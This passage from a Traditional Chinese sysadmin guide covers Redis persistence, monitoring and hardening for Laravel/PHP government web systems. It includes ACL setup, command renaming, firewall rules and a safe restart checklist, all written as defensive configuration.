6) "/var/lib/redis"
```

`save 3600 1 300 100 60 10000` 讀成三句話：

- 3600 秒內有 **1** 個 key 變動 → 存檔
- 300 秒內有 **100** 個 key 變動 → 存檔
- 60 秒內有 **10000** 個 key 變動 → 存檔

★★ 不同版本／發行版的預設條件略有差異（舊版是 `900 1 / 300 10 / 60 10000`），
**以 `CONFIG GET save` 的實際輸出為準**，不要照抄文章。

```bash
ls -lh /var/lib/redis/
```

```text
total 1.2M
-rw-rw---- 1 redis redis 1.2M Aug 28 10:02 dump.rdb      # ★★★ 權限 660、擁有者 redis
```

> [!danger] ★★★ `bgsave` 要 fork，這是 `vm.overcommit_memory` 的由來
> `bgsave` 的做法是 **fork 出一個子行程**，由子行程把記憶體快照寫成檔案。
> Linux 的 copy-on-write 讓 fork 當下不會真的複製 4 GB，
> 但**只要父行程在存檔期間持續寫入，被改到的頁面就會真的被複製**。
> 寫入量大時，記憶體用量最壞情況接近**翻倍**。
>
> Linux 預設 `vm.overcommit_memory=0`（啟發式判斷），會在「看起來記憶體不夠」時
> **直接拒絕 fork**，於是 `bgsave` 失敗 → 觸發下一段的 ★★★★★ MISCONF 連鎖。
> Redis 啟動時就會在 log 裡警告你：
>
> ```text
> WARNING overcommit_memory is set to 0! Background save may fail under low memory
> condition. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf ...
> ```
>
> 設定方式（機制與其他 sysctl 項目見 [[020-01-26-guide-Linux-核心模組與sysctl調校]]）：
>
> ```bash
> echo 'vm.overcommit_memory = 1' | sudo tee /etc/sysctl.d/99-redis.conf
> sudo sysctl --system | grep overcommit
> ```
> ```text
> vm.overcommit_memory = 1
> ```

手動觸發與檢查：

```bash
redis-cli BGSAVE
```

```text
Background saving started
```

```bash
redis-cli INFO persistence | grep -E 'rdb_bgsave_in_progress|rdb_last_bgsave_status|rdb_last_save_time'
```

```text
rdb_bgsave_in_progress:0
rdb_last_bgsave_status:ok          # ★★★★★ 這行必須是 ok，err 就是 MISCONF 前兆
rdb_last_save_time:1787890800
```

★★★★ **把 `rdb_last_bgsave_status` 納入監控。** 它變成 `err` 之後、
使用者發現全站 500 之前，通常還有幾分鐘到幾小時的緩衝時間。

### 持久化 ②：AOF 附加檔

AOF 是「把每一個寫入指令依序記下來」，重啟時重播一次。

```bash
redis-cli CONFIG GET appendonly appendfsync aof-use-rdb-preamble appenddirname
```

原廠輸出：

```text
1) "appendonly"
2) "no"                  # ★★★★ 預設【關閉】
3) "appendfsync"
4) "everysec"
5) "aof-use-rdb-preamble"
6) "yes"
7) "appenddirname"
8) "appendonlydir"       # ★★ Redis 7 起 AOF 拆成一個目錄裡的多個檔案
```

`appendfsync` 的三個選項：

| 值 | 行為 | 最壞損失 | 效能 | 星級 |
| --- | --- | --- | --- | --- |
| `always` | 每一個寫入指令都 `fsync()` 到磁碟 | 幾乎為 0 | ★★★★ 慢很多，機械硬碟上不可用 | ★★ |
| `everysec` | ★★★★ 每秒 `fsync()` 一次（**預設**） | **最多 1 秒的寫入** | 好 | ★★★★ |
| `no` | 交給 OS 決定何時刷（可能 30 秒） | 可能數十秒 | 最好 | ★ |

★★★★ **`everysec` 是絕大多數場景的正確答案。** 對 session 來說，
「掉最後 1 秒的登入」跟「全部人登出」差了好幾個數量級。

開啟 AOF（**可以熱開，不用重啟**）：

```bash
redis-cli CONFIG SET appendonly yes
redis-cli INFO persistence | grep -E 'aof_enabled|aof_rewrite_in_progress|aof_last_bgrewrite_status|aof_last_write_status'
```

```text
aof_enabled:1
aof_rewrite_in_progress:0
aof_last_bgrewrite_status:ok
aof_last_write_status:ok           # ★★★★ 這兩行都要是 ok
```

```bash
sudo ls -lh /var/lib/redis/appendonlydir/
```

```text
-rw-rw---- 1 redis redis  88 Aug 28 10:31 appendonly.aof.1.base.rdb    # ★ base 是 RDB 格式
-rw-rw---- 1 redis redis 12K Aug 28 10:44 appendonly.aof.1.incr.aof    # ★ 增量是指令流
-rw-rw---- 1 redis redis  88 Aug 28 10:31 appendonly.aof.manifest
```

★★ 這就是 `aof-use-rdb-preamble yes` 的**混合模式**：base 用 RDB 格式（小、載入快），
增量用 AOF 格式（不掉資料）。兩全其美，Redis 5 之後預設就是這樣，不用改。

★★★ **AOF 重寫的成本要算進磁碟規劃**：AOF 長到一定大小會自動觸發 `BGREWRITEAOF`，
過程中同時存在新舊兩份檔案，**磁碟需要留兩倍空間**，而且會有一波 IO。
`/var/lib/redis` 所在的分割區至少留 `maxmemory` 的 3 倍空間。

### 決策表：這台 Redis 到底要開什麼

| 這個 instance 放什麼 | RDB | AOF | policy | 掉資料的後果 |
| --- | --- | --- | --- | --- |
| **純 cache** | ★ `save ""` 全關 | ★ `no` | `allkeys-lru` | 重啟後冷啟動，DB 壓力上升幾分鐘，**功能正常** |
| **session** | ★★ 可留（多一層保險） | ★★★★★ **`yes` + `everysec`** | `noeviction` | 全站登出 |
| **queue** | ★★ 可留 | ★★★★★ **`yes` + `everysec`** | `noeviction` | ★★★★★ 未處理任務永久消失 |
| **三者混在一起**（不建議） | 留 | ★★★★ 必須開 | ★★★★ 只能 `noeviction` | 見上面的災難段 |

> [!danger] ★★★★★ 「反正是快取」的心態會讓你在重啟時弄丟真的資料
> 很多人把 Redis 當成「重啟無所謂的東西」。**只要這台 Redis 上有 session 或 queue，
> 重啟就不是無害操作。**
>
> `systemctl restart redis-server` 在沒開持久化時的實際後果：
> - 所有登入使用者被登出（正在填的線上申辦表單消失）
> - `queues:default` 裡待處理的任務**永久消失** —— 民眾送出的案件沒有進到下一關，
>   而且**不會有任何錯誤訊息**，因為 Laravel 那邊早就回「已送出」了
>
> ★★★★ 這在機關環境是會被追究的等級。重啟前的正確流程見下一段。

### ★★★★ 重啟 Redis 前的正確流程

```bash
# ① 先確認持久化是開的、而且最近一次成功
redis-cli INFO persistence | grep -E 'aof_enabled|aof_last_write_status|rdb_last_bgsave_status'
```

```text
aof_enabled:1
aof_last_write_status:ok
rdb_last_bgsave_status:ok        # ★★★★ 任何一項不是 1/ok 就先停下來查
```

```bash
# ② 確認佇列是空的（★★★★★ 最重要的一步）
redis-cli LLEN laravel_database_queues:default
```

```text
(integer) 0                       # ★ 0 才可以重啟；不是 0 就先讓 worker 消化完
```

```bash
# ③ 強制存一次檔（同步，會阻塞，所以挑離峰時段）
redis-cli BGREWRITEAOF ; sleep 5 ; redis-cli INFO persistence | grep aof_rewrite_in_progress
```

```text
aof_rewrite_in_progress:0         # ★ 0 = 寫完了
```

```bash
# ④ 備份資料目錄（還原演練與保存週期見 [[060-01-06-03-guide-傳輸-備份策略與還原演練]]）
sudo tar czf /var/backups/redis-$(date +%F-%H%M).tar.gz -C /var/lib redis

# ⑤ 這時候才重啟
sudo systemctl restart redis-server

# ⑥ 重啟後驗證資料還在
redis-cli DBSIZE
```

```text
(integer) 18342                   # ★★★ 跟重啟前的數字對得上才算成功
```

★★★ 備份策略（頻率、異地、加密、**還原演練**）不在本篇展開，
`/var/lib/redis` 的 `dump.rdb` 與 `appendonlydir/` 就是要備份的東西，
納入 [[060-01-06-03-guide-傳輸-備份策略與還原演練]] 的排程即可。
★★★★ **只備份不演練等於沒備份** —— Redis 的還原演練特別簡單：
把備份解到另一台的 `dir`、啟動、`DBSIZE` 對得上就算通過。

### 系統面：檔案描述元與連線數

```bash
redis-cli CONFIG GET maxclients
```

```text
1) "maxclients"
2) "10000"
```

★★★ Redis 開機時會拿 `LimitNOFILE` 減掉保留值當作實際的 `maxclients`，
所以你設 10000、實際可能只有 4064。log 裡會講：

```text
# You requested maxclients of 10000 requiring at least 10032 max file descriptors.
# Server can't set maximum open files to 10032 because of OS error: Operation not permitted.
# Current maximum open files is 4096. maxclients has been reduced to 4064 ...
```

用 systemd drop-in 調高（**不要直接改套件的 unit 檔**，`apt upgrade` 會覆蓋掉）：

```bash
sudo systemctl edit redis-server
```

在編輯器裡填入：

```ini
[Service]
LimitNOFILE=65535
```

```bash
sudo systemctl daemon-reload
sudo systemctl restart redis-server        # ★★★ 這個改動需要重啟才生效，先做上一段的檢查
grep 'Max open files' /proc/$(pgrep -f 'redis-server 127')/limits
```

```text
Max open files            65535                65535                files
```

**要不要調的判斷**：`PHP-FPM 的 pm.max_children × 站台數 × 每個 worker 的 Redis 連線數`。
兩台 web、每台 `pm.max_children=50`、每個 worker 開 1 條連線 = 100 條，
預設值綽綽有餘。★★ **會踩到上限的通常是「有人忘了關連線」或「用了 persistent 連線又開太多池」**，
先查 `INFO clients` 再決定要不要調參數。

### 與 Laravel / PHP 的串接（只講 Redis 這一側）

**phpredis vs Predis 的維運選擇**：

| 項目 | **phpredis**（`php8.3-redis`，C 擴充） | **Predis**（純 PHP，composer 套件） |
| --- | --- | --- |
| 效能 | ★★★ 明顯較好（尤其大量小操作） | 較慢 |
| 記憶體 | ★★★ 較省 | 每個 worker 多吃幾 MB |
| 安裝 | 要裝系統套件 + 重啟 PHP-FPM | `composer require predis/predis` |
| 建議 | ★★★★ **正式環境用 phpredis** | 只在不能裝擴充的環境用 |

```bash
sudo apt install -y php8.3-redis
php -m | grep -i redis
```

```text
redis                         # ★★★★ 沒看到這行，Laravel 會在執行期才爆
```

```bash
sudo systemctl restart php8.3-fpm       # ★★★ 裝完一定要重啟 FPM，否則舊 worker 沒載入
php -i | grep -E '^redis|Redis Version'
```

```text
redis
Redis Version => 6.1.0
```

> [!warning] ★★★ `REDIS_CLIENT=phpredis` 但擴充沒裝的症狀
> Laravel 會丟 `Class "Redis" not found`，而且是在**第一次真的要用 Redis 的時候**才爆 ——
> 部署當下的 `php artisan config:cache` 可能完全正常，
> 直到第一個使用者登入才 500。★★★★ **部署腳本裡加一行 `php -m | grep -q redis`
> 當作前置檢查**，比事後排錯便宜得多。

`.env` 關鍵設定（逐行註解）：

```ini
REDIS_CLIENT=phpredis            # ★★★ 要跟 php -m 的結果一致
REDIS_HOST=192.168.10.30         # ★★★★ 不要寫 0.0.0.0；跨機時寫內網 IP
REDIS_PORT=6379                  # session instance
REDIS_PASSWORD=<32字元以上>       # ★★★★ 空字串代表不認證，見安全段
REDIS_USERNAME=laravel           # ★★★ 用 ACL 使用者時才需要；只用 requirepass 時留空
REDIS_DB=0                       # 預設連線用的 database
REDIS_CACHE_DB=1                 # ★★★ cache 走另一個 db（只避免誤清，不解決淘汰）
REDIS_PREFIX=srv_apply_          # ★★★★ 多站共用時的救命稻草，見下方

CACHE_STORE=redis                # Laravel 11+；Laravel 10 以前是 CACHE_DRIVER=redis
SESSION_DRIVER=redis
SESSION_LIFETIME=120             # 分鐘
QUEUE_CONNECTION=redis
```

> [!danger] ★★★★ 沒設 `REDIS_PREFIX`，A 站會清光 B 站的 session
> Laravel 預設的 prefix 是 `Str::slug(APP_NAME, '_') . '_database_'`。
> 兩個站台的 `APP_NAME` 如果都留著預設值 `Laravel`，
> **它們的 key 前綴一模一樣**，共用同一台 Redis 時就是同一個 namespace。
>
> 於是 A 站部署時跑一行 `php artisan cache:clear`，
> ★★★★★ **B 站的使用者全部被登出**（`cache:clear` 對 Redis store 的實作會清掉整個
> prefix 底下的 key，細節見 [[130-01-04-04-guide-Laravel-快取最佳化與部署流程]]）。
>
> 設定位置在 `config/database.php` 的 `redis.options.prefix`，
> 預設會讀 `REDIS_PREFIX`。**每個站台給一個不同的值**，例如 `srv_apply_`、`srv_query_`。
>
> 驗證方式（把所有 key 的第一段抓出來去重）：
>
> ```bash
> redis-cli --scan --pattern '*' | awk -F: '{print $1}' | sed 's/[a-f0-9]\{20,\}$//' | sort -u | head
> ```
> ```text
> srv_apply_laravel_cache_
> srv_apply_queues
> srv_query_laravel_cache_
> ```
> ★★★ 看到只有一種前綴、但你明明有兩個站台，就是中獎了。

**非 Laravel 的純 PHP 站台**（很多機關的舊系統是這種）：

```ini
; /etc/php/8.3/fpm/conf.d/50-redis-session.ini
session.save_handler = redis
session.save_path = "tcp://192.168.10.30:6379?auth=你的密碼&database=0"
```

> [!danger] ★★★★ 這個 `save_path` 等於把密碼公開
> `session.save_path` 會出現在：
> - `phpinfo()` 的輸出（★★★★★ 如果站台上還留著 `info.php`，等於直接把 Redis 密碼貼在網路上）
> - PHP 的例外堆疊與錯誤頁（`display_errors=On` 時直接印給使用者看）
> - `/etc/php/8.3/fpm/php.ini` 的檔案權限如果是 644，任何本機使用者都讀得到
>
> 對策：
> 1. ★★★★★ **刪掉所有 `phpinfo()` 頁面**，並用 [[060-01-04-04-guide-nmap-埠掃描與盤點]] 的方式定期盤點
> 2. `display_errors = Off`（正式環境本來就該關）
> 3. 把設定放在獨立的 `.ini` 並設 `640 root:www-data`
> 4. ★★★ 用 ACL 使用者而不是 `requirepass`，把這組密碼的權限壓到最小
>    （只能碰 `PHPREDIS_SESSION:*`，不能 `CONFIG`、不能 `FLUSHALL`）

### 監控與容量判斷

```bash
redis-cli INFO memory | grep -E '^used_memory:|^used_memory_human|^used_memory_rss_human|^used_memory_peak_human|^maxmemory_human|^maxmemory_policy|^mem_fragmentation_ratio'
```

```text
used_memory:1073741824
used_memory_human:1.00G           # ★ Redis 自己認為用了多少
used_memory_rss_human:1.24G       # ★ OS 看到這個行程實際佔了多少
used_memory_peak_human:1.61G      # ★★★ 歷史高點 —— 容量規劃要看這個，不是現值
maxmemory_human:2.00G
maxmemory_policy:allkeys-lru
mem_fragmentation_ratio:1.24      # = rss / used_memory
```

★★★★ **`mem_fragmentation_ratio` 是最容易誤讀的一個數字**：

| 值 | 意義 | 該做什麼 | 星級 |
| --- | --- | --- | --- |
| 1.0 ~ 1.5 | 正常 | 不用管 | ★ |
| > 1.5 | 碎片明顯（大量 key 被刪除後留下的空洞） | ★★★ 開 `activedefrag yes`，或挑離峰重啟一次 | ★★★ |
| **< 1.0** | ★★★★★ **RSS 比 used_memory 還小 = 有記憶體被換到 swap 了** | ★★★★★ 立刻查 `free -h`，Redis 一旦碰 swap，延遲會從微秒級掉到毫秒級甚至更差 | ★★★★★ |

```bash
redis-cli INFO stats | grep -E 'evicted_keys|expired_keys|keyspace_hits|keyspace_misses|rejected_connections|total_connections_received'
```

```text
evicted_keys:0                    # ★★★★ session instance 上這個【必須恆為 0】
expired_keys:184203               # ★ 正常過期，健康的數字
keyspace_hits:9821004
keyspace_misses:1204331
rejected_connections:0            # ★★★ 不是 0 = 撞到 maxclients
total_connections_received:88213
```

命中率的算法：

```bash
redis-cli INFO stats | awk -F: '/keyspace_hits|keyspace_misses/{a[$1]=$2} END{h=a["keyspace_hits"]+0; m=a["keyspace_misses"]+0; if(h+m>0) printf "命中率 %.2f%%\n", h/(h+m)*100; else print "尚無資料"}'
```

```text
命中率 89.08%
```

**「看到什麼 → 代表什麼 → 先查哪裡」判斷表**：

| 看到 | 代表什麼 | 先查哪裡 | 星級 |
| --- | --- | --- | --- |
| `evicted_keys` 持續增加（cache instance） | maxmemory 不夠，或 TTL 設太長 | `--bigkeys` 找大 key；評估加記憶體 | ★★★ |
| `evicted_keys` > 0（**session instance**） | ★★★★★ policy 設錯了，使用者正在被隨機登出 | `CONFIG GET maxmemory-policy`，馬上改 `noeviction` | ★★★★★ |
| 命中率 < 80% | TTL 太短，或快取 key 設計把不該快取的東西丟進來 | 回到應用層看 [[130-01-04-04-guide-Laravel-快取最佳化與部署流程]] | ★★★ |
| `mem_fragmentation_ratio` < 1 | ★★★★★ 已經在用 swap | `free -h`、`vmstat 1 5` 的 `si/so` 欄 | ★★★★★ |
| `rejected_connections` > 0 | 撞到 `maxclients` | `INFO clients` 的 `connected_clients`；查是不是連線沒關 | ★★★ |
| `rdb_last_bgsave_status:err` | ★★★★★ 存檔失敗，MISCONF 即將發生 | `df -h /var/lib/redis`、目錄權限 | ★★★★★ |
| `blocked_clients` 一直很高 | 有 client 在做 `BLPOP` 等待（通常是 worker，正常） | 對照 worker 數量，數字對得上就不用管 | ★★ |
| `latest_fork_usec` 很大（> 500000） | fork 花了 0.5 秒以上，這段時間全部停頓 | 記憶體太大或機器太慢；考慮拆 instance | ★★★ |

**四個一定要會的 `redis-cli` 觀測工具**：

```bash
redis-cli --stat            # ★★★ 每秒一行的即時總覽，事故當下第一個開
```

```text
------- data ------ --------------------- load -------------------- - child -
keys       mem      clients blocked requests            connections
18342      1.02G    24      2       9821004 (+0)        88213
18344      1.02G    25      2       9821311 (+307)      88215
```

```bash
redis-cli --bigkeys         # ★★★★ 找出誰在吃記憶體（用 SCAN，不阻塞）
```

```text
[00.00%] Biggest string found so far '"srv_apply_laravel_cache_report:2026"' with 8412331 bytes
[42.13%] Biggest list   found so far '"srv_apply_queues:default"' with 18422 items
...
-------- summary -------
Sampled 18342 keys in the keyspace!
Biggest string found '"srv_apply_laravel_cache_report:2026"' has 8412331 bytes   # ★★★★ 8MB 的單一快取
Biggest list   found '"srv_apply_queues:default"' has 18422 items                # ★★★★ 佇列積了 1.8 萬筆
```

```bash
redis-cli --latency         # 持續量測基礎延遲，Ctrl-C 結束
```

```text
min: 0, max: 3, avg: 0.11 (1482 samples)     # ★ 內網個位數毫秒以內算正常
```

```bash
redis-cli --latency-history -i 10   # 每 10 秒一段，看延遲有沒有週期性尖峰
```

```text
min: 0, max: 2, avg: 0.10 (982 samples) -- 10.01 seconds range
min: 0, max: 41, avg: 0.38 (871 samples) -- 10.00 seconds range   # ★★★ 這段有東西阻塞了
```

★★★ 看到週期性尖峰，對照 `INFO persistence` 的 `rdb_last_save_time` 或
`aof_rewrite_in_progress`，八成是存檔／重寫造成的 fork 停頓。

---

## 完整實戰範例

### 情境

某機關的**線上申辦系統**：

```text
                     ┌──────────────┐
   民眾 ──> [WAF] ──>│ web1  10.10 │──┐
                     │ Nginx+PHP-FPM│  │        ┌────────────────────────┐
                     │ Laravel      │  ├──────> │ redis01  192.168.10.30 │
                     └──────────────┘  │        │  8 GB RAM / 2 vCPU     │
                     ┌──────────────┐  │        │  ┌──────────────────┐  │
   民眾 ──> [WAF] ──>│ web2  10.11 │──┘        │  │ :6379 session+queue│  │
                     │ Nginx+PHP-FPM│           │  │  AOF / noeviction  │  │
                     │ Laravel      │───┐       │  │  maxmemory 2gb     │  │
                     └──────────────┘   │       │  ├──────────────────┤  │
                                        │       │  │ :6380 cache        │  │
                                        │       │  │  save "" / lru     │  │
                                        │       │  │  maxmemory 3gb     │  │
                                        │       │  └──────────────────┘  │
                                        │       └────────────────────────┘
                                        ▼
                              ┌──────────────────┐
                              │ db01 192.168.10.20│  MySQL
                              └──────────────────┘

web1 = 192.168.10.10 / web2 = 192.168.10.11 / redis01 = 192.168.10.30
```

**目標**：一次做完安裝、拆 instance、加密碼與 ACL、收監聽面、封危險指令、
調系統參數、改兩台 web 的 `.env`，並產出可以貼進稽核回覆的整改對照表。

### 步驟 ①：安裝並確認預設監聽面

```bash
# 在 redis01 上
sudo apt update && sudo apt install -y redis-server
sudo ss -lntp | grep 6379
```

```text
LISTEN 0 511 127.0.0.1:6379 0.0.0.0:* users:(("redis-server",pid=1421,fd=6))
LISTEN 0 511     [::1]:6379    [::]:* users:(("redis-server",pid=1421,fd=6))
```

★★★ 這是**整改前基線**，記下來，稽核回覆表要用。

### 步驟 ②：產生密碼並建立兩個 instance 的設定檔

```bash
# 用 Redis 自己的 ACL GENPASS 產生 256-bit 隨機密碼（比 pwgen 之類更可信）
REDIS_PASS="$(redis-cli ACL GENPASS)"
LARAVEL_PASS="$(redis-cli ACL GENPASS)"
echo "$REDIS_PASS"
```

```text
9f3ab2c7d1e04856b7a3f9c2d8e15074a6b3c9d2e7f8016a4b5c6d7e8f901234    # 64 字元 hex
```

★★★★ **把這兩組密碼存進機關的密碼保管機制**（KeePass、Vault…），
不要留在 shell history 裡。稍後腳本會示範用 `REDISCLI_AUTH` 而不是 `-a`。

```bash
# ---- session instance：/etc/redis/redis-session.conf ----
sudo cp -a /etc/redis/redis.conf /etc/redis/redis-session.conf
sudo tee -a /etc/redis/redis-session.conf >/dev/null <<EOF

# ================= 機關線上申辦系統 session/queue instance =================
# 2026-08-28 維運組建置
port 6379
pidfile /run/redis-session/redis-server.pid
logfile /var/log/redis/redis-session.log
dir /var/lib/redis-session

# --- 監聽面 ---
bind 192.168.10.30 127.0.0.1        # ★★★★★ 只綁內網介面與本機，不是 0.0.0.0
protected-mode yes                   # ★★★★ 不要關

# --- 認證 ---
requirepass ${REDIS_PASS}

# --- 記憶體：session 與 queue 絕對不能被淘汰 ---
maxmemory 2gb
maxmemory-policy noeviction          # ★★★★★ 這行是本篇的重點

# --- 持久化：一定要開 ---
appendonly yes
appendfsync everysec
save 3600 1 300 100 60 10000

# --- 封印危險指令（★★★ 已被官方標為 deprecated，只當第二道防線）---
rename-command FLUSHALL ""
rename-command FLUSHDB ""
rename-command KEYS ""
rename-command MODULE ""
EOF

# ---- cache instance：/etc/redis/redis-cache.conf ----
sudo cp -a /etc/redis/redis.conf /etc/redis/redis-cache.conf
sudo tee -a /etc/redis/redis-cache.conf >/dev/null <<EOF

# ================= 機關線上申辦系統 cache instance =================
port 6380
pidfile /run/redis-cache/redis-server.pid
logfile /var/log/redis/redis-cache.log
dir /var/lib/redis-cache

bind 192.168.10.30 127.0.0.1
protected-mode yes
requirepass ${REDIS_PASS}

maxmemory 3gb
maxmemory-policy allkeys-lru         # ★★★★ 純快取，可以也應該淘汰

# --- 不持久化：重啟只是冷啟動 ---
save ""                              # ★★★ 空字串 = 關掉所有 RDB 條件
appendonly no

rename-command FLUSHALL ""
rename-command KEYS ""
rename-command MODULE ""
EOF

# 權限：★★★★ 檔案裡有明文密碼
sudo chown redis:redis /etc/redis/redis-session.conf /etc/redis/redis-cache.conf
sudo chmod 640 /etc/redis/redis-session.conf /etc/redis/redis-cache.conf
```

> [!warning] ★★★ `rename-command` 已被官方標記為 DEPRECATED
> Redis 官方在 `redis.conf` 裡明確寫了「避免使用這個選項，改用 ACL」。
> 它的問題是：改名之後**所有工具都會壞掉**（監控腳本、備份工具、
> 甚至 `redis-cli --bigkeys` 內部若用到被封的指令），而且它是全域的、無法針對使用者。
>
> 本篇仍然保留它，理由是**縱深防禦**：萬一密碼外洩、ACL 設錯，
> 這一層還能擋住最常見的 `FLUSHALL`。
> ★★★★ **但主力必須是 ACL** —— 見步驟 ④。

### 步驟 ③：建目錄、啟動、停用預設 instance

```bash
sudo install -d -o redis -g redis -m 750 /var/lib/redis-session /var/lib/redis-cache

# ★★★★ 停掉並停用原本那個 127.0.0.1:6379 的預設 instance，避免 port 打架
sudo systemctl disable --now redis-server

sudo systemctl enable --now redis-server@session
sudo systemctl enable --now redis-server@cache

systemctl is-active redis-server@session redis-server@cache
```

```text
active
active
```

```bash
sudo ss -lntp | grep -E '6379|6380'
```

```text
LISTEN 0 511 192.168.10.30:6379 0.0.0.0:* users:(("redis-server",pid=2101,fd=7))
LISTEN 0 511    127.0.0.1:6379 0.0.0.0:* users:(("redis-server",pid=2101,fd=6))
LISTEN 0 511 192.168.10.30:6380 0.0.0.0:* users:(("redis-server",pid=2140,fd=7))
LISTEN 0 511    127.0.0.1:6380 0.0.0.0:* users:(("redis-server",pid=2140,fd=6))
```

★★★★ **確認沒有任何一行是 `0.0.0.0`**。

### 步驟 ④：建立受限的 ACL 使用者

`requirepass` 設的是 **default 使用者**的密碼，而 default 使用者是 `+@all ~* &*` ——
拿到這組密碼的人可以 `CONFIG SET`、可以 `FLUSHALL`、可以 `SHUTDOWN`。
★★★★ **應用程式不該用這組。**

```bash
export REDISCLI_AUTH="$REDIS_PASS"      # ★★★★ 用環境變數，不要用 -a（見安全段）

redis-cli -h 127.0.0.1 -p 6379 ACL SETUSER laravel on ">${LARAVEL_PASS}" \
  '~srv_apply_*' '&srv_apply_*' \
  +@all -@dangerous -@admin \
  +info +client\|setname +client\|getname \
  -flushall -flushdb -swapdb
```

```text
OK
```

逐段解釋（★★★★ 這幾個細節官方文件有寫，但很少人照做）：

| 片段 | 作用 | 星級 |
| --- | --- | --- |
| `~srv_apply_*` | 只能操作這個前綴的 key | ★★★★ |
| `&srv_apply_*` | 只能用這個前綴的 Pub/Sub 頻道。★★★★ **Redis 7 起 `acl-pubsub-default` 預設是 `resetchannels`**，不寫這段，Laravel 的 broadcasting / Horizon 會**靜默失效** | ★★★★ |
| `+@all -@dangerous -@admin` | 給全部、再拿掉危險與管理類 | ★★★ |
| `+info` | ★★★★ **`INFO` 屬於 `@dangerous`**，被 `-@dangerous` 一起拿掉了。Horizon 與監控要用，得單獨加回來 | ★★★★ |
| `-flushall -flushdb -swapdb` | ★★★★★ **key pattern 擋不住這三個** —— 官方明講「不接受 key 參數的指令不受 `~pattern` 限制」，必須逐一 `-` 掉 | ★★★★★ |

驗證這個使用者真的被關起來了：

```bash
redis-cli -h 127.0.0.1 -p 6379 --user laravel --pass "$LARAVEL_PASS" --no-auth-warning SET srv_apply_test 1
redis-cli -h 127.0.0.1 -p 6379 --user laravel --pass "$LARAVEL_PASS" --no-auth-warning SET other_test 1
redis-cli -h 127.0.0.1 -p 6379 --user laravel --pass "$LARAVEL_PASS" --no-auth-warning CONFIG GET dir
redis-cli -h 127.0.0.1 -p 6379 --user laravel --pass "$LARAVEL_PASS" --no-auth-warning FLUSHALL
```

```text
OK
(error) NOPERM ... no permissions to access one of the keys used as arguments   # ★★★★ 正確
(error) NOPERM ... has no permissions to run the 'config|get' command           # ★★★★ 正確
(error) NOPERM ... has no permissions to run the 'flushall' command             # ★★★★★ 正確
```

★★★ 把 ACL 寫進設定檔才會在重啟後留著：

```bash
redis-cli -h 127.0.0.1 -p 6379 ACL SAVE 2>/dev/null || redis-cli -h 127.0.0.1 -p 6379 CONFIG REWRITE
redis-cli -h 127.0.0.1 -p 6379 ACL LIST
```

```text
1) "user default on #9f3a...(sha256) sanitize-payload ~* &* +@all"
2) "user laravel on #4c8b...(sha256) sanitize-payload ~srv_apply_* &srv_apply_* +@all -@admin -@dangerous +info ..."
```

> [!danger] ★★★★ `aclfile` 與 `requirepass` 不能並用
> `redis.conf` 明講：**設了 `aclfile` 之後 `requirepass` 會被忽略**，
> 而且 `ACL SAVE` 只有在使用 `aclfile` 時才有意義。
> 兩種寫法擇一：
> - **簡單環境**：使用者直接寫在 `redis.conf` 的 `user ...` 行，用 `CONFIG REWRITE` 存檔
> - **多使用者環境**：改用 `aclfile /etc/redis/users.acl`，
>   ★★★★ 這時 default 使用者的密碼也要寫在 acl 檔裡（`user default on >密碼 ~* &* +@all`），
>   不能再靠 `requirepass`，否則**重啟後變成無密碼**

### 步驟 ⑤：防火牆只放行 web1 / web2

```bash
# 語法與基本觀念見 [[090-02-02-guide-防火牆-ufw基礎與實務]]
sudo ufw allow from 192.168.10.10 to any port 6379 proto tcp comment 'web1 -> redis session'
sudo ufw allow from 192.168.10.11 to any port 6379 proto tcp comment 'web2 -> redis session'
sudo ufw allow from 192.168.10.10 to any port 6380 proto tcp comment 'web1 -> redis cache'
sudo ufw allow from 192.168.10.11 to any port 6380 proto tcp comment 'web2 -> redis cache'
sudo ufw status numbered | grep 638
```

```text
[ 3] 6379/tcp     ALLOW IN   192.168.10.10   # web1 -> redis session
[ 4] 6379/tcp     ALLOW IN   192.168.10.11   # web2 -> redis session
[ 5] 6380/tcp     ALLOW IN   192.168.10.10   # web1 -> redis cache
[ 6] 6380/tcp     ALLOW IN   192.168.10.11   # web2 -> redis cache
```

★★★ 跨機房或跨網段時，優先走 [[020-02-01-05-cmd-SSH-隧道與埠轉發]]，
或啟用 Redis 6 的 `tls-port`（需要憑證，成本較高但是唯一能加密傳輸的做法）。
★★★★ **Redis 的協定是明文的** —— session 裡常有姓名、身分證字號，
在不受信任的網段上裸奔等於個資外洩。

### 步驟 ⑥：系統參數

```bash
sudo tee /etc/sysctl.d/99-redis.conf >/dev/null <<'EOF'
vm.overcommit_memory = 1     # ★★★★ 不設，bgsave / AOF rewrite 在記憶體吃緊時會失敗
net.core.somaxconn = 1024    # ★★ 高連線數時的 accept 佇列
EOF
sudo sysctl --system | grep -E 'overcommit_memory|somaxconn'
```

```text
vm.overcommit_memory = 1
net.core.somaxconn = 1024
```

```bash
# 關掉 THP（Redis 啟動時會警告；機制見 [[020-01-26-guide-Linux-核心模組與sysctl調校]]）
echo never | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
```

```text
never
```

★★★ 上面這行**重開機就沒了**，要做成 systemd unit 或加到 GRUB 參數才會持久。

```bash
# 兩個 instance 都調高 LimitNOFILE
for i in session cache; do
  sudo mkdir -p "/etc/systemd/system/redis-server@${i}.service.d"
  printf '[Service]\nLimitNOFILE=65535\n' | sudo tee "/etc/systemd/system/redis-server@${i}.service.d/limits.conf" >/dev/null
done
sudo systemctl daemon-reload
sudo systemctl restart redis-server@session redis-server@cache
```

### 步驟 ⑦：兩台 web 的 .env

web1（`/var/www/apply/.env`）：

```ini
REDIS_CLIENT=phpredis
REDIS_HOST=192.168.10.30
REDIS_PORT=6379
REDIS_USERNAME=laravel
REDIS_PASSWORD=<LARAVEL_PASS>
REDIS_DB=0
REDIS_PREFIX=srv_apply_          # ★★★★ 兩台 web 是【同一個站台】，prefix 要一樣

CACHE_STORE=redis
SESSION_DRIVER=redis
QUEUE_CONNECTION=redis
```

★★★ cache instance 在 6380，Laravel 的 `config/database.php` 要多一組連線；
Laravel 預設的 `redis.cache` 連線只有 `database` 不同，
**要指到不同 port 必須自己加 `'port' => env('REDIS_CACHE_PORT', 6380)`**。
應用層設定的細節在 [[130-01-04-04-guide-Laravel-快取最佳化與部署流程]]。

★★★★ 另一個站台（例如查詢系統）如果也接這台 Redis，
`REDIS_PREFIX` 必須換成 `srv_query_`，否則就是前面那個 ★★★★ 事故。

### 加固檢查腳本

```bash
sudo tee /usr/local/bin/redis-hardening-check.sh >/dev/null <<'SCRIPT'
#!/usr/bin/env bash
#
